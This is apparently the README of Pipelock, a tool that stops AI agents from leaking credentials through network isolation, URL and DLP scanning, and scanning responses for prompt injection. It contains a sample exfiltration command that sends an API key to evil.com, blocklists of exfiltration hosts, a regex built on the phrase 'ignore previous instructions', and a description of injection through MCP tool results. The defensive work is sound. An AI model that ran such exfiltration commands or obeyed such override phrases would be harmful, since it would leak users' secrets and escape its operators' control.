<p align="center">
  <img src="assets/logo.jpg" alt="Pipelock" width="200">
</p>

# Pipelock

[![CI](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml)
[![Go Report Card](https://goreportcard.com/badge/github.com/luckyPipewrench/pipelock)](https://goreportcard.com/report/github.com/luckyPipewrench/pipelock)
[![CodeQL](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml/badge.svg)](https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml)
[![codecov](https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg)](https://codecov.io/gh/luckyPipewrench/pipelock)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

**Security harness for AI agents.** Controls what your agent can access on the network, preventing credential exfiltration while preserving web browsing capability.

If you run Claude Code, OpenHands, or any AI agent with shell access and API keys, this is for you.

[Blog](https://luckypipewrench.github.io/pipelock/) | [GitHub](https://github.com/luckyPipewrench/pipelock)

## The Problem

AI agents increasingly run with shell access, API keys in environment variables, and unrestricted internet access. If an agent is compromised — through prompt injection, jailbreak, or a bug — it can exfiltrate secrets with a single HTTP request.

```
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over
```

**Current state of the art: nothing.** No general-purpose tool exists to prevent this.

## How Pipelock Works

Pipelock uses **capability separation** — the agent process (which has secrets) is network-restricted, while a separate fetch proxy (which has NO secrets) handles web browsing.

```
BALANCED MODE (default):

┌──────────────────────┐         ┌─────────────────────┐
│  PRIVILEGED ZONE     │         │  FETCH ZONE          │
│                      │         │                      │
│  AI Agent            │  IPC    │  Fetch Proxy         │
│  - Has API keys      │────────>│  - NO secrets        │
│  - Has credentials   │ "fetch  │  - Full internet     │
│  - Restricted network│  url"   │  - Returns text      │
│                      │<────────│  - URL scanning      │
│  Can reach:          │ content │  - Audit logging     │
│  ✓ api.anthropic.com │         │                      │
│  ✓ discord.com       │         │  Can reach:          │
│  ✗ evil.com          │         │  ✓ Any URL           │
│  ✗ pastebin.com      │         │  But has:            │
└──────────────────────┘         │  ✗ No env secrets    │
                                 │  ✗ No credentials    │
                                 └─────────────────────┘
```

## Requirements

- Go 1.24+

## Quick Start

```bash
# Install from source
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest

# Or pull the Docker image
docker pull ghcr.io/luckypipewrench/pipelock:latest

# Start the fetch proxy with default settings
pipelock run

# Start with a config file (supports hot-reload on file change or SIGHUP)
pipelock run --config pipelock.yaml

# Validate your config
pipelock check --config pipelock.yaml

# Scan a URL to test scanner behavior
pipelock check --url "https://pastebin.com/raw/abc123"

# Generate a config from a preset
pipelock generate config --preset balanced --output pipelock.yaml

# Generate a Docker Compose file for network-isolated deployment
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml

# Show version and build info
pipelock version
```

## Three Modes

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Airtight | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

## Security Matrix

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Prevented** (restricted DNS) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate limiting) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode provides mathematical certainty. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today.

## Configuration

```yaml
version: 1
mode: balanced
enforce: true              # set false for audit mode (log without blocking)

api_allowlist:
  - "*.anthropic.com"
  - "*.openai.com"
  - "*.discord.com"
  - "github.com"

fetch_proxy:
  listen: "127.0.0.1:8888"
  timeout_seconds: 30
  max_response_mb: 10        # max fetched response body size
  user_agent: "Pipelock Fetch/1.0"
  monitoring:
    entropy_threshold: 4.5   # flag high-entropy URL segments
    max_url_length: 2048
    max_requests_per_minute: 60  # per-domain rate limit
    blocklist:
      - "*.pastebin.com"    # known exfiltration targets
      - "*.transfer.sh"

dlp:
  scan_env: true             # detect env variable leaks in URLs
  patterns:
    - name: "Anthropic API Key"
      regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}'
      severity: critical
    - name: "AWS Access Key"
      regex: 'AKIA[0-9A-Z]{16}'
      severity: critical

response_scanning:
  enabled: true
  action: warn               # block, strip, or warn
  patterns:
    - name: "Prompt Injection"
      regex: '(?i)(ignore|disregard)\s+(all\s+)?(previous|prior)\s+(instructions|prompts)'

logging:
  format: json
  output: stdout             # or a file path
  include_allowed: true
  include_blocked: true

# SSRF protection: internal CIDRs to block (omit to disable)
internal:
  - "127.0.0.0/8"
  - "10.0.0.0/8"
  - "172.16.0.0/12"
  - "192.168.0.0/16"
  - "169.254.0.0/16"
  - "::1/128"
  - "fc00::/7"
  - "fe80::/10"

git_protection:
  enabled: false
  allowed_branches: ["feature/*", "fix/*", "main"]
  pre_push_scan: true
```

Three presets are included: `configs/strict.yaml`, `configs/balanced.yaml`, `configs/audit.yaml`.

Generate one with: `pipelock generate config --preset balanced --output pipelock.yaml`

## URL Scanning

The fetch proxy scans every URL before fetching:

1. **SSRF protection** — blocks requests to internal/private IPs (169.254.x.x, 10.x.x.x, etc.) with DNS rebinding prevention
2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh, etc.)
3. **Rate limiting** — per-domain sliding window rate limits
4. **DLP patterns** — regex matching for API keys, tokens, and secrets in URLs
5. **Environment variable leak detection** — checks for high-entropy env var values in URLs (raw + base64-encoded)
6. **Entropy analysis** — Shannon entropy scoring flags encoded/encrypted data in URL segments
7. **URL length limits** — unusually long URLs suggest data exfiltration

## Response Scanning

Fetched page content is scanned for prompt injection patterns before being returned to the agent:

- **Prompt injection** — "ignore previous instructions" and variants
- **System/role overrides** — attempts to hijack system prompts
- **Jailbreak attempts** — DAN mode, developer mode, etc.

Three actions:
- `block` — reject the response entirely (403)
- `strip` — redact matched text with `[REDACTED:<pattern-name>]` markers and return the rest
- `warn` — log the detection and pass content through unmodified

## Multi-Agent Support

When multiple agents share one Pipelock proxy, each identifies itself via the `X-Pipelock-Agent` header (or `?agent=` query parameter). The agent name appears in every audit log entry and in the JSON response, enabling per-agent filtering and monitoring.

```bash
curl -H "X-Pipelock-Agent: my-bot" "http://localhost:8888/fetch?url=https://example.com"
```

Agent names are sanitized to `[a-zA-Z0-9._-]` and truncated to 64 characters.

## Fetch Proxy API

```bash
# Fetch a URL (returns extracted text content)
curl "http://localhost:8888/fetch?url=https://example.com"

# Health check (includes uptime, feature flags, DLP pattern count)
curl "http://localhost:8888/health"

# Prometheus metrics
curl "http://localhost:8888/metrics"

# JSON stats (top blocked domains, scanner hits, block rate)
curl "http://localhost:8888/stats"

# Version and build info
pipelock version
```

Fetch response format:
```json
{
  "url": "https://example.com",
  "agent": "my-bot",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "This domain is for use in illustrative examples...",
  "blocked": false
}
```

Health response format:
```json
{
  "status": "healthy",
  "version": "x.y.z",
  "mode": "balanced",
  "uptime_seconds": 3600.5,
  "dlp_patterns": 8,
  "response_scan_enabled": true,
  "git_protection_enabled": false,
  "rate_limit_enabled": true
}
```

Stats response format:
```json
{
  "uptime_seconds": 3600.5,
  "requests": {
    "total": 150,
    "allowed": 142,
    "blocked": 8,
    "block_rate": 0.053
  },
  "top_blocked_domains": [
    {"name": "pastebin.com", "count": 5},
    {"name": "transfer.sh", "count": 3}
  ],
  "top_scanners": [
    {"name": "blocklist", "count": 5},
    {"name": "dlp", "count": 3}
  ]
}
```

## File Integrity Monitoring

Pipelock monitors agent workspace directories for unauthorized changes — detecting modified, added, or removed files. This is the first layer of defense against [lateral movement in multi-agent systems](https://luckypipewrench.github.io/pipelock/blog/2026/02/08/lateral-movement-multi-agent-llm/).

```bash
# Generate a manifest of all files in the workspace
pipelock integrity init ./workspace --exclude "logs/**" --exclude "temp/**"

# Check for unauthorized changes
pipelock integrity check ./workspace
# Exit 0 = clean, non-zero = violations found

# Machine-readable output
pipelock integrity check ./workspace --json

# Re-hash after reviewing and approving changes
pipelock integrity update ./workspace

# Store manifest outside the workspace for extra security
pipelock integrity init ./workspace --manifest /secure/location/manifest.json
```

The manifest records SHA256 hashes for every file. The check command reports modified files (content changed), added files (unexpected new files), and removed files (expected files missing from disk).

## Git Protection

Pipelock includes git-aware security commands for scanning diffs and installing pre-push hooks:

```bash
# Scan a git diff for secrets (reads from stdin)
git diff HEAD~1 | pipelock git scan-diff
git diff --cached | pipelock git scan-diff --config pipelock.yaml

# Install pre-push hook that scans outgoing commits
pipelock git install-hooks
pipelock git install-hooks --config pipelock.yaml --force
```

> **Note:** Branch glob patterns use Go's `filepath.Match`, which only supports single-level wildcards. `feature/*` matches `feature/login` but **not** `feature/login/oauth`. Use flat branch naming or multiple patterns if needed.

## Ed25519 Signing

Pipelock includes Ed25519 key management for signing and verifying files — the cryptographic layer for securing inter-agent communication.

```bash
# Generate a key pair for an agent
pipelock keygen my-bot

# Sign a file
pipelock sign manifest.json --agent my-bot

# Verify a file's signature
pipelock verify manifest.json --agent my-bot

# Trust another agent's public key
pipelock trust other-bot /path/to/other-bot.pub
```

Keys are stored under `~/.pipelock/agents/<name>/` (private + public) and `~/.pipelock/trusted_keys/` (trusted peers). Key format uses versioned headers (`pipelock-ed25519-public-v1`) for forward compatibility.

## MCP Response Scanning

Scan [Model Context Protocol](https://modelcontextprotocol.io/) JSON-RPC 2.0 responses for prompt injection before they reach the agent. MCP tool responses are a lateral movement channel — a compromised MCP server can inject prompt injection payloads into tool call results.

```bash
# Scan MCP responses from stdin
mcp-server | pipelock mcp scan

# JSON output mode
pipelock mcp scan --json --config pipelock.yaml < responses.jsonl
```

Exit code 0 if all responses are clean, 1 if any injection is detected. Uses the same prompt injection patterns as response scanning. Text content is extracted from all `type=text` content blocks and concatenated (catching injection split across blocks).

## Docker

### Pull from GHCR

```bash
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 ghcr.io/luckypipewrench/pipelock:latest
```

### Build locally

```bash
docker build -t pipelock .
docker run -p 8888:8888 pipelock
```

### Docker Compose (network-isolated agent)

Generate a Docker Compose file that runs your agent in a network-isolated container with Pipelock as the only internet gateway:

```bash
# Supported agents: generic, claude-code, openhands
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up
```

The generated compose file creates two containers:
- **pipelock** — the fetch proxy with full internet access
- **agent** — your AI agent on an internal-only network, can only reach pipelock

## Building

```bash
# Build with version metadata
make build

# Run tests
make test

# Lint
make lint

# Build Docker image
make docker
```

The Makefile injects build metadata (version, date, commit, Go version) via ldflags.

## Project Structure

```
cmd/pipelock/          CLI entry point
internal/
  cli/                 Cobra commands (run, check, generate, logs, git, integrity, mcp,
                         keygen, sign, verify, trust, version, healthcheck)
  config/              YAML config loading, validation, defaults, hot-reload (fsnotify)
  scanner/             URL scanning (SSRF, blocklist, rate limit, DLP, entropy, env leak)
  audit/               Structured JSON audit logging (zerolog)
  proxy/               Fetch proxy HTTP server (go-readability, agent ID, DNS pinning)
  metrics/             Prometheus metrics + JSON stats endpoint
  gitprotect/          Git-aware security (diff scanning, branch validation, hooks)
  integrity/           File integrity monitoring (SHA256 manifests, check/diff, exclusions)
  signing/             Ed25519 key management, file signing, signature verification
  mcp/                 MCP JSON-RPC 2.0 response scanning (prompt injection detection)
configs/               Preset config files (strict, balanced, audit)
blog/                  GitHub Pages blog (Jekyll)
```

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://owasp.org/www-project-agentic-ai-top-10/)
- Competitive analysis includes [agentsh](https://github.com/canyonroad/agentsh) — complementary tool (shell-level policy)
- Security review contributions from Dylan Corrales

## License

Apache License 2.0 — Copyright 2026 Josh Waldrep

See [LICENSE](LICENSE) for the full text.
